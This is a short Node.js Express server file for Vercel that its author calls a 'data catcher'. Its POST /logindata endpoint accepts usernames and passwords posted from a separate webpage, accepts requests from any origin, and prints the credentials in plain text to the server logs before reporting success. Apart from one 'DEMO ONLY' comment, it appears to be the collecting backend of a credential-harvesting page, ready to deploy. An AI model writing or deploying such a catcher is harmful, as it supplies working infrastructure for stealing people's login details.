// api/server.js
const express = require('express');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors()); // Allows your webpage to talk to this catcher
app.use(express.json()); // Helps understand data sent as JSON
app.use(express.urlencoded({ extended: true })); // Also good to have for form data, though we use JSON

// This is where the data comes in from your front-end
app.post('/logindata', (req, res) => {
    const { username, password } = req.body; // Get the username and password from the request
    const timestamp = new Date().toISOString();

    if (!username || !password) {
        // If username or password is not provided, send an error response
        return res.status(400).json({ message: 'Username and password are required.' });
    }

    // Log the received data to Vercel's console (you'll see this in Vercel's runtime logs)
    console.log("--- DATA RECEIVED (Vercel) ---");
    console.log("Timestamp:", timestamp);
    console.log("Username:", username);
    console.log("Password:", password, "<-- WARNING: This is plain text! For DEMO ONLY.");
    console.log("------------------------------");

    // Tell the front-end webpage "Ok, I got the data!"
    return res.status(200).json({ message: 'Data received successfully by Vercel catcher!' });
});

// A test route to see if the API itself is accessible when you visit the base URL
app.get('/', (req, res) => {
    return res.send('My Vercel Data Catcher API is alive and well!');
});


// IMPORTANT: For Vercel, we export the Express 'app' instance.
// Vercel handles starting the server and listening for requests.
module.exports = app;
